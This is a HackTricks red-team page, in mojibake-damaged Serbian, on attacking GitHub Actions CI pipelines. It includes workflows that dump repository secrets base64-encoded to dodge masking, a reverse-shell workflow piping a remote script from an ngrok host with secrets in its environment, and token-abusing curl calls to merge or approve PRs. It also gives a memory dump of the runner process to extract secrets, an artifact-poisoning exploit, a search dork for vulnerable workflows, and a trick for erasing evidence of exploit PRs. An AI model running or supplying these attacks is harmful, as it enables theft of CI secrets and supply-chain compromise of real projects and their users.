# Zloupotreba Github Actions

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne Informacije

Na ovoj stranici Ä‡ete pronaÄ‡i:

* **SaÅ¾etak svih uticaja** napadaÄa koji uspe da pristupi Github Action
* RazliÄite naÄine za **dobijanje pristupa akciji**:
* Imati **dozvole** za kreiranje akcije
* Zloupotreba **pull request** povezanih okidaÄa
* Zloupotreba **drugih eksternih pristupnih** tehnika
* **Pivotiranje** iz veÄ‡ kompromitovanog repozitorijuma
* Na kraju, sekcija o **post-eksploatacionim tehnikama za zloupotrebu akcije iznutra** (uzrokovanje pomenutih uticaja)

## SaÅ¾etak Uticaja

Za uvod o [**Github Actions pogledajte osnovne informacije**](../basic-github-information.md#github-actions).

U sluÄaju da moÅ¾ete **izvrÅ¡avati proizvoljne Github akcije/ubacivati kod** u **repozitorijum**, mogli biste:

* **Ukrasti** **tajne** iz tog repozitorijuma/organizacije.
* Ako moÅ¾ete samo ubacivati, moÅ¾ete ukrasti Å¡ta god je veÄ‡ prisutno u workflow-u.
* Zloupotrebiti **privilegije repozitorijuma** za pristup drugim platformama kao Å¡to su AWS i GCP.
* **IzvrÅ¡avati kod u prilagoÄ‘enim radnicima** (ako se koriste prilagoÄ‘eni radnici) i pokuÅ¡ati pivotirati odatle.
* **Prepisati** kod repozitorijuma.
* Ovo zavisi od privilegija `GITHUB_TOKEN` (ako ih ima).
* **Kompromitovati** **deploymente** i druge **artefakte**.
* Ako kod deployuje ili skladiÅ¡ti neÅ¡to, mogli biste to modifikovati i dobiti dalji pristup.

## GITHUB\_TOKEN

Ovaj "**secret**" (dolazi iz `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se daje kada admin omoguÄ‡i ovu opciju:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti onaj koji Ä‡e koristiti **Github Application**, tako da moÅ¾e pristupiti istim endpoint-ovima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github bi trebalo da objavi [**flow**](https://github.com/github/roadmap/issues/74) koji **omoguÄ‡ava pristup izmeÄ‘u repozitorijuma** unutar GitHub-a, tako da repozitorijum moÅ¾e pristupiti drugim internim repozitorijumima koristeÄ‡i `GITHUB_TOKEN`.
{% endhint %}

MoÅ¾ete videti moguÄ‡e **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Napomena da token **istiÄe nakon zavrÅ¡etka posla**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neke zanimljive stvari koje moÅ¾ete uraditi sa ovim tokenom:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Imajte na umu da Ä‡ete u nekoliko navrata moÄ‡i pronaÄ‡i **github korisniÄke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati viÅ¡e privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>PrikaÅ¾i tajne u Github Action izlazu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverse shell-a sa secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

MoguÄ‡e je proveriti dozvole date Github Token-u u repozitorijumima drugih korisnika **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno IzvrÅ¡enje

{% hint style="info" %}
Ovo bi bio najlakÅ¡i naÄin da kompromitujete Github akcije, jer ovaj sluÄaj pretpostavlja da imate pristup da **kreirate novi repo u organizaciji**, ili imate **prava pisanja nad repozitorijumom**.

Ako ste u ovom scenariju, moÅ¾ete jednostavno proveriti [Post Exploitation tehnike](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### IzvrÅ¡enje iz Kreiranja Repozitorijuma

U sluÄaju da Älanovi organizacije mogu **kreirati nove repozitorijume** i moÅ¾ete izvrÅ¡avati github akcije, moÅ¾ete **kreirati novi repo i ukrasti tajne postavljene na nivou organizacije**.

### IzvrÅ¡enje iz Nove Grane

Ako moÅ¾ete **kreirati novu granu u repozitorijumu koji veÄ‡ sadrÅ¾i Github Akciju** konfigurisan, moÅ¾ete ga **modifikovati**, **uploadovati** sadrÅ¾aj, a zatim **izvrÅ¡iti tu akciju iz nove grane**. Na ovaj naÄin moÅ¾ete **eksfiltrirati tajne repozitorijuma i organizacije** (ali morate znati kako se zovu).

MoÅ¾ete uÄiniti modifikovanu akciju izvrÅ¡ivom **ruÄno**, kada se **PR kreira** ili kada se **neki kod push-uje** (u zavisnosti od toga koliko Å¾elite da budete buÄni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Postoje razliÄiti okidaÄi koji bi mogli omoguÄ‡iti napadaÄu da **izvrÅ¡i Github Action drugog repozitorijuma**. Ako su te akcije koje se mogu pokrenuti loÅ¡e konfigurisane, napadaÄ bi mogao da ih kompromituje.
{% endhint %}

### `pull_request`

OkidaÄ workflow-a **`pull_request`** Ä‡e izvrÅ¡iti workflow svaki put kada se primi pull request sa nekim izuzecima: po defaultu, ako je to **prvi put** da **saraÄ‘ujete**, neki **odrÅ¾avalac** Ä‡e morati da **odobri** **pokretanje** workflow-a:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kako je **default ograniÄenje** za **prvi put** saradnike, moÅ¾ete doprineti **ispravljanjem validne greÅ¡ke/pravopisne greÅ¡ke** i zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da kreirate nalog sa imenom nekoga ko je doprineo projektu i obrisao svoj nalog.~~
{% endhint %}

Å taviÅ¡e, po defaultu **spreÄava dozvole za pisanje** i **pristup tajnama** ciljnog repozitorijuma kao Å¡to je navedeno u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Sa izuzetkom `GITHUB_TOKEN`, **tajne se ne prenose na runner** kada je workflow pokrenut iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima samo dozvole za Äitanje** u pull request-ovima **iz forkovanih repozitorijuma**.

NapadaÄ bi mogao da izmeni definiciju Github Action-a kako bi izvrÅ¡io proizvoljne stvari i dodao proizvoljne akcije. MeÄ‘utim, neÄ‡e moÄ‡i da ukrade tajne ili prepiÅ¡e repozitorijum zbog pomenutih ograniÄenja.

{% hint style="danger" %}
**Da, ako napadaÄ promeni u PR-u github action koji Ä‡e biti pokrenut, njegov Github Action Ä‡e biti koriÅ¡Ä‡en, a ne onaj iz originalnog repozitorijuma!**
{% endhint %}

Kako napadaÄ takoÄ‘e kontroliÅ¡e kod koji se izvrÅ¡ava, Äak i ako nema tajni ili dozvola za pisanje na `GITHUB_TOKEN`, napadaÄ bi mogao, na primer, **upload-ovati zlonamerne artefakte**.

### **`pull_request_target`**

OkidaÄ workflow-a **`pull_request_target`** ima **dozvolu za pisanje** u ciljni repozitorijum i **pristup tajnama** (i ne traÅ¾i dozvolu).

Napomena da okidaÄ workflow-a **`pull_request_target`** **radi u osnovnom kontekstu** a ne u onom koji daje PR (da **ne izvrÅ¡ava nepouzdani kod**). Za viÅ¡e informacija o `pull_request_target` [**pogledajte dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Å taviÅ¡e, za viÅ¡e informacija o ovoj specifiÄnoj opasnoj upotrebi pogledajte ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

MoÅ¾da izgleda da je **izvrÅ¡eni workflow** onaj definisan u **osnovi** i **ne u PR-u** pa je **sigurno** koristiti **`pull_request_target`**, ali postoje **nekoliko sluÄajeva gde nije**.

A ovaj Ä‡e imati **pristup tajnama**.

### `workflow_run`

OkidaÄ [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omoguÄ‡ava pokretanje workflow-a iz drugog kada je `completed`, `requested` ili `in_progress`.

U ovom primeru, workflow je konfigurisana da se pokrene nakon Å¡to se zavrÅ¡i zasebni "Run Tests" workflow:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Å taviÅ¡e, prema dokumentaciji: Workflow pokrenut dogaÄ‘ajem `workflow_run` moÅ¾e **pristupiti tajnama i pisati tokene, Äak i ako prethodni workflow nije mogao**.

Ovakav workflow moÅ¾e biti napadnut ako **zavisi** od **workflow-a** koji moÅ¾e biti **pokrenut** od strane eksternog korisnika putem **`pull_request`** ili **`pull_request_target`**. Nekoliko ranjivih primera moÅ¾e se [**pronaÄ‡i na ovom blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi primer se sastoji od workflow-a pokrenutog `workflow_run` koji preuzima napadaÄev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi primer se sastoji od **prosleÄ‘ivanja** **artefakta** iz **nepouzdanog** koda u workflow `workflow_run` i koriÅ¡Ä‡enja sadrÅ¾aja tog artefakta na naÄin koji ga Äini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvrÅ¡ava iz pull\_request koristi/preuzima kod iz originala ili iz forkovanog PR-a

## Zloupotreba Forkovanog IzvrÅ¡enja

Pomenuli smo sve naÄine na koje eksterni napadaÄ moÅ¾e naterati github workflow da se izvrÅ¡i, sada da pogledamo kako se ta izvrÅ¡enja, ako su loÅ¡e konfigurisana, mogu zloupotrebiti:

### Nepouzdano izvrÅ¡enje checkout-a

U sluÄaju **`pull_request`,** workflow Ä‡e se izvrÅ¡iti u **kontekstu PR-a** (tako da Ä‡e izvrÅ¡iti **zlonamerni kod PR-a**), ali neko mora **prvo da ga odobri** i izvrÅ¡iÄ‡e se sa nekim [ograniÄenjima](./#pull\_request).

U sluÄaju workflow-a koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od workflow-a koji moÅ¾e biti pokrenut iz **`pull_request_target` ili `pull_request`** kod iz originalnog repozitorijuma Ä‡e biti izvrÅ¡en, tako da **napadaÄ ne moÅ¾e kontrolisati izvrÅ¡eni kod**.

{% hint style="danger" %}
MeÄ‘utim, ako **akcija** ima **eksplicitni PR checkout** koji Ä‡e **preuzeti kod iz PR-a** (a ne iz baze), koristiÄ‡e kod koji kontroliÅ¡e napadaÄ. Na primer (pogledajte liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. PruÅ¾eno samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdan kod se izvrÅ¡ava tokom `npm install` ili `npm build`** jer su build skripte i referencirani **paketi kontrolisani od strane autora PR-a**.

{% hint style="warning" %}
GitHub dork za pretragu ranjivih akcija je: `event.pull_request pull_request_target extension:yml` meÄ‘utim, postoje razliÄiti naÄini za konfigurisanje poslova da se izvrÅ¡avaju sigurno Äak i ako je akcija konfigurisana nesigurno (kao Å¡to je koriÅ¡Ä‡enje uslovnih izraza o tome ko je akter koji generiÅ¡e PR).
{% endhint %}

### Injekcije skripti u kontekstu <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Napomena da postoje odreÄ‘eni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) Äije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github akcija koristi te **podatke za izvrÅ¡enje bilo Äega**, to moÅ¾e dovesti do **arbitrarne izvrÅ¡enja koda:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Injekcija Skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Prema dokumentaciji: MoÅ¾ete uÄiniti da je **promenljiva okruÅ¾enja dostupna bilo kojem sledeÄ‡em koraku** u workflow poslu definisanjem ili aÅ¾uriranjem promenljive okruÅ¾enja i pisanjem toga u **`GITHUB_ENV`** datoteku okruÅ¾enja.

Ako napadaÄ moÅ¾e **ubaciti bilo koju vrednost** unutar ove **env** promenljive, mogao bi ubaciti env promenljive koje mogu izvrÅ¡iti kod u sledeÄ‡im koracima kao Å¡to su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovaj**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovaj**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje uploadovanom artefaktu da saÄuva njegov sadrÅ¾aj unutar **`GITHUB_ENV`** env promenljive. NapadaÄ bi mogao uploadovati neÅ¡to poput ovoga da ga kompromituje:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Ranjive TreÄ‡e Strane Github Akcije

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao Å¡to je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Akcija omoguÄ‡ava pristup artefaktima iz razliÄitih workflow-a pa Äak i repozitorijuma.

Problem je Å¡to ako parametar **`path`** nije postavljen, artefakt se ekstrahuje u trenutni direktorijum i moÅ¾e prepisati fajlove koji bi kasnije mogli biti koriÅ¡Ä‡eni ili Äak izvrÅ¡eni u workflow-u. Dakle, ako je Artefakt ranjiv, napadaÄ bi mogao zloupotrebiti ovo da kompromituje druge workflow-e koji veruju Artefaktu.

Primer ranjivog workflow-a:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto sa ovim workflow-om:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ostali Spoljni Pristup

### Otmica Obrisane ImeniÄke Repozitorijuma

Ako nalog promeni svoje ime, drugi korisnik moÅ¾e registrovati nalog sa tim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github Ä‡e omoguÄ‡iti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj obrisani.

{% hint style="danger" %}
Dakle, ako akcija koristi repozitorijum sa nepostojeÄ‡eg naloga, i dalje je moguÄ‡e da napadaÄ kreira taj nalog i kompromituje akciju.
{% endhint %}

Ako su drugi repozitorijumi koristili **zavisnosti iz repozitorijuma ovog korisnika**, napadaÄ Ä‡e moÄ‡i da ih otme. Ovde imate potpunije objaÅ¡njenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Preusmeravanje Repozitorijuma

{% hint style="info" %}
U ovom odeljku Ä‡emo govoriti o tehnikama koje omoguÄ‡avaju **preusmeravanje sa jednog repozitorijuma na drugi** pod pretpostavkom da imamo neku vrstu pristupa prvom (pogledajte prethodni odeljak).
{% endhint %}

### Trovanje KeÅ¡a

KeÅ¡ se odrÅ¾ava izmeÄ‘u **pokretanja radnih tokova na istoj grani**. Å to znaÄi da ako napadaÄ **kompromituje** **paket** koji se zatim Äuva u keÅ¡u i **preuzima** i izvrÅ¡ava **radni tok sa viÅ¡e privilegija**, on Ä‡e moÄ‡i da **kompromituje** i taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje Artefakata

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova, pa Äak i repozitorijuma**, ako napadaÄ uspe da **kompromituje** Github Akciju koja **otprema artefakt** koji se kasnije koristi u drugom radnom toku, on moÅ¾e **kompromitovati druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Eksploatacija iz Akcije

### Pristup AWS i GCP putem OIDC

Pogledajte sledeÄ‡e stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristup tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadrÅ¾aj u skriptu, zanimljivo je znati kako moÅ¾ete pristupiti tajnama:

* Ako je tajna ili token postavljen kao **promenljiva okruÅ¾enja**, moÅ¾e se direktno pristupiti kroz okruÅ¾enje koristeÄ‡i **`printenv`**.

<details>

<summary>Lista tajni u izlazu Github Akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverse shell-a sa secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript se Äuva **na disku** i dostupan je.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript actions tajne se Å¡alju kroz promenljive okruÅ¾enja
* ```bash
ps axe | grep node
```
* Za **custom action**, rizik moÅ¾e varirati u zavisnosti od toga kako program koristi tajnu dobijenu iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba Self-hosted runners

NaÄin da se pronaÄ‘e koje **Github Actions se izvrÅ¡avaju u ne-github infrastrukturi** je pretraga za **`runs-on: self-hosted`** u Github Action konfiguracionom yaml fajlu.

**Self-hosted** runners mogu imati pristup **dodatnim osetljivim informacijama**, drugim **mreÅ¾nim sistemima** (ranjivi krajnji taÄke u mreÅ¾i? metadata service?) ili, Äak i ako su izolovani i uniÅ¡teni, **viÅ¡e od jedne akcije moÅ¾e biti pokrenuto u isto vreme** i zlonamerna akcija moÅ¾e **ukrasti tajne** druge akcije.

U self-hosted runners je takoÄ‘e moguÄ‡e dobiti **tajne iz \_Runner.Listener**\_\*\* procesa\*\* koji Ä‡e sadrÅ¾ati sve tajne workflow-a u bilo kom koraku tako Å¡to se isprazni njegova memorija:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Pogledajte [**ovaj post za viÅ¡e informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

MoguÄ‡e je napraviti Github actions koje Ä‡e **izgraditi i saÄuvati Docker sliku unutar Github-a**.\
Primer se moÅ¾e naÄ‡i u sledeÄ‡em proÅ¡irivom delu:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao Å¡to ste mogli videti u prethodnom kodu, Github registar je hostovan u **`ghcr.io`**.

Korisnik sa dozvolama za Äitanje nad repozitorijumom Ä‡e tada moÄ‡i da preuzme Docker Image koristeÄ‡i liÄni pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik moÅ¾e pretraÅ¾iti **procurele tajne u Docker slojevima slike:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u Github Actions logovima

ÄŒak i ako **Github** pokuÅ¡ava da **detektuje tajne vrednosti** u logovima akcija i **izbegne njihovo prikazivanje**, **druge osetljive podatke** koji su mogli biti generisani tokom izvrÅ¡enja akcije neÄ‡e biti sakriveni. Na primer, JWT potpisan sa tajnom vrednoÅ¡Ä‡u neÄ‡e biti sakriven osim ako nije [specifiÄno konfigurisan](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Prikrivanje tragova

(Tehnika iz [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki PR koji je podignut je jasno vidljiv javnosti na Github-u i ciljanom GitHub nalogu. Na Github-u po defaultu, **ne moÅ¾emo obrisati PR sa interneta**, ali postoji zaokret. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PR-ovi su automatski obrisani** i uklonjeni sa interneta. Dakle, da biste sakrili svoju aktivnost, potrebno je ili da vam **GitHub nalog bude suspendovan ili da vam nalog bude oznaÄen**. Ovo bi **sakrilo sve vaÅ¡e aktivnosti** na GitHub-u sa interneta (u suÅ¡tini uklonilo sve vaÅ¡e exploit PR-ove).

Organizacija na GitHub-u je veoma proaktivna u prijavljivanju naloga GitHub-u. Sve Å¡to treba da uradite je da podelite â€œneke stvariâ€ u Issue i oni Ä‡e se pobrinuti da vaÅ¡ nalog bude suspendovan za 12 sati :p i eto, uÄinili ste svoj exploit nevidljivim na github-u.

{% hint style="warning" %}
Jedini naÄin da organizacija shvati da je bila meta je da proveri GitHub logove iz SIEM-a jer sa GitHub UI-a PR bi bio uklonjen.
{% endhint %}

## Alati

SledeÄ‡i alati su korisni za pronalaÅ¾enje Github Action workflow-ova i Äak pronalaÅ¾enje ranjivih:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
NauÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove podnoÅ¡enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
